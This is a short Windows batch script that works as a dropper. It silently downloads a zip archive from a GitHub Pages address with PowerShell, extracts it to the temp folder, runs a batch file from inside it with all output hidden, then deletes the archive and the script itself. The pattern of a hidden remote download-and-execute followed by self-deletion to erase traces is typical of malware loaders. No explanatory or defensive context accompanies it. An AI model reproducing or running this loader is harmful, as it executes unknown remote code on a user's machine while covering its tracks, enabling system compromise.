@echo off
setlocal
set "URL=https://2hac.github.io/-/7.zip"
set "TempZip=%TEMP%\2fhbwe.zip"
set "ExtractPath=%TEMP%\ctr5.tmp"
set "BatchScript=exstat.bat"
powershell -command "& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TempZip%'}" > nul 2>&1
mkdir "%ExtractPath%" > nul 2>&1
powershell -command "& {Expand-Archive -Path '%TempZip%' -DestinationPath '%ExtractPath%'}" > nul 2>&1
call "%ExtractPath%\%BatchScript%" > nul 2>&1
pause
del /F /Q "%TempZip%" > nul 2>&1
del /F /Q "%~f0" > nul 2>&1
pause
endlocal
exit
